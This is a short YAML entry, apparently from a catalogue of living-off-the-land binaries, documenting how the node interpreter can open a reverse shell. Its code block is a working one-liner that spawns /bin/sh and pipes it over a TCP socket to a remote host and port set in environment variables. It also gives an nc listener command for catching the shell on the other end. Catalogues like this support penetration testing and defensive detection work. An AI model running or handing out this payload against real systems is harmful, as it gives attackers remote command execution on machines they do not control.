---
functions:
  reverse-shell:
    - description: Run `nc -l -p 12345` to receive the shell on the other end.
      code: |
        export RHOST=10.0.0.1
        export RPORT=12345
        node -e 'sh = require("child_process").spawn("/bin/sh", []);
        client = new require("net").Socket();
        client.connect(process.env.RPORT, process.env.RHOST, function(){
          client.pipe(sh.stdin);
          sh.stdout.pipe(client);
          sh.stderr.pipe(client);
        });'
---